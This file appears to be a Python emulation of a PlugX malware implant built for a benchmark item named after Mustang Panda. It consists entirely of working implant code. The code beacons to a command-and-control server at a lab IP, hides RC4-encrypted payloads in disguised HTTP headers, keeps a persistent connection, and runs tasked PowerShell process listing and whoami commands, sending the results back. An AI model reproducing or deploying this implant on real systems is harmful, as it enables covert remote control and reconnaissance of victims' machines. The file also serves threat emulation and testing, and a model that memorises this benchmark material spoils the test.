"""PlugX implant for bench_v4 AEL-MUSTANG-PANDA-PLUGX-001.

Beacons to the PlugX C2 server using the PlugX protocol:
  - GET / with Sec-Dest (implant ID) and Sec-Site (base64 RC4-encrypted beacon)
  - Receives task packets, executes tasks, sends output in next beacon
"""
from __future__ import annotations
import base64
import os
import socket
import struct
import subprocess
import sys
import time
import uuid

RC4_KEY = b"secret_key"


def _rc4(data: bytes, key: bytes = RC4_KEY) -> bytes:
    s = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s[i] + key[i % len(key)]) % 256
        s[i], s[j] = s[j], s[i]
    out = bytearray()
    i = j = 0
    for byte in data:
        i = (i + 1) % 256
        j = (j + s[i]) % 256
        s[i], s[j] = s[j], s[i]
        out.append(byte ^ s[(s[i] + s[j]) % 256])
    return bytes(out)


def _build_packet(task_id: int, args: str, content: bytes = b"") -> bytes:
    arg_bytes = args.encode() + b"\x00" if args else b""
    return struct.pack("<III", task_id, len(arg_bytes), len(content)) + arg_bytes + content


def _parse_packet(data: bytes) -> tuple[int, str, bytes]:
    if len(data) < 12:
        return 0, "", b""
    task_id, arg_len, content_len = struct.unpack("<III", data[:12])
    offset = 12
    args = ""
    if arg_len > 0 and offset + arg_len <= len(data):
        args = data[offset:offset + arg_len].rstrip(b"\x00").decode("utf-8", errors="replace")
        offset += arg_len
    content = b""
    if content_len > 0 and offset + content_len <= len(data):
        content = data[offset:offset + content_len]
    return task_id, args, content


def _beacon_persistent(sock: socket.socket, host: str, port: int, implant_id: str, output: bytes = b"") -> bytes:
    beacon_data = _build_packet(0, "", output) if output else _build_packet(0, "beacon")
    encrypted = _rc4(beacon_data)
    encoded = base64.b64encode(encrypted).decode()
    request_line = f"GET / HTTP/1.1\r\nHost: {host}:{port}\r\nSec-Dest: {implant_id}\r\nSec-Site: {encoded}\r\nUser-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\n\r\n"
    sock.sendall(request_line.encode())
    resp_data = b""
    while b"\r\n\r\n" not in resp_data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        resp_data += chunk
    header_end = resp_data.find(b"\r\n\r\n")
    body = resp_data[header_end + 4:] if header_end >= 0 else b""
    content_length = 0
    for line in resp_data[:header_end].decode(errors="replace").split("\r\n"):
        if line.lower().startswith("content-length:"):
            content_length = int(line.split(":")[1].strip())
    while len(body) < content_length:
        chunk = sock.recv(4096)
        if not chunk:
            break
        body += chunk
    return body


def _execute_task(task_id: int, args: str) -> bytes:
    if task_id == 1 and "enum" in args.lower():
        result = subprocess.run(
            ["powershell", "-Command", "Get-Process | Select-Object Id,ProcessName | Format-Table -AutoSize"],
            capture_output=True, text=True, timeout=30,
        )
        return result.stdout.encode()
    if task_id == 1 and "whoami" in args.lower():
        result = subprocess.run(["whoami"], capture_output=True, text=True, timeout=10)
        return result.stdout.encode()
    return b""


def _keepalive_thread(host, port, implant_id):
    """Background thread that maintains a persistent TCP connection for freeze_target_identity."""
    import socket as _socket
    while True:
        try:
            sock = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
            sock.settimeout(60)
            sock.connect((host, port))
            beacon_data = _build_packet(0, "beacon")
            encrypted = _rc4(beacon_data)
            encoded = base64.b64encode(encrypted).decode()
            req = f"GET / HTTP/1.1\r\nHost: {host}:{port}\r\nSec-Dest: {implant_id}\r\nSec-Site: {encoded}\r\nUser-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\n\r\n"
            sock.sendall(req.encode())
            # Read and discard response, but keep socket open
            resp = b""
            while b"\r\n\r\n" not in resp:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                resp += chunk
            # Read body
            hdr_end = resp.find(b"\r\n\r\n")
            body = resp[hdr_end+4:] if hdr_end >= 0 else b""
            clen = 0
            for line in resp[:hdr_end].decode(errors="replace").split("\r\n"):
                if line.lower().startswith("content-length:"):
                    clen = int(line.split(":")[1].strip())
            while len(body) < clen:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                body += chunk
            # Keep socket alive indefinitely
            while True:
                time.sleep(1)
                try:
                    sock.sendall(b"")
                except Exception:
                    break
            sock.close()
        except Exception:
            pass
        time.sleep(2)


def main():
    import threading
    import urllib.request
    server_url = sys.argv[1] if len(sys.argv) > 1 else "http://192.168.21.132:18451/"
    if not server_url.endswith("/"):
        server_url += "/"
    from urllib.parse import urlparse
    parsed = urlparse(server_url)
    host = parsed.hostname
    port = parsed.port or 80
    implant_id = str(uuid.uuid4())
    output_data = b""
    # Start keepalive thread
    t = threading.Thread(target=_keepalive_thread, args=(host, port, implant_id), daemon=True)
    t.start()
    time.sleep(2)  # let keepalive connect first
    # Beacon loop using urllib (short connections)
    while True:
        try:
            beacon_data = _build_packet(1, "output", output_data) if output_data else _build_packet(0, "beacon")
            encrypted = _rc4(beacon_data)
            encoded = base64.b64encode(encrypted).decode()
            req = urllib.request.Request(
                server_url,
                headers={"Sec-Dest": implant_id, "Sec-Site": encoded, "User-Agent": "Mozilla/5.0"},
                method="GET",
            )
            resp = urllib.request.urlopen(req, timeout=15)
            resp_data = resp.read()
            output_data = b""
            if resp_data == b"success":
                time.sleep(3)
                continue
            if resp_data:
                try:
                    decrypted = _rc4(base64.b64decode(resp_data))
                    task_id, args, content = _parse_packet(decrypted)
                    if task_id > 0:
                        result = _execute_task(task_id, args)
                        output_data = result if result else b"task_completed"
                except Exception:
                    pass
        except Exception:
            pass
        time.sleep(3)


if __name__ == "__main__":
    main()
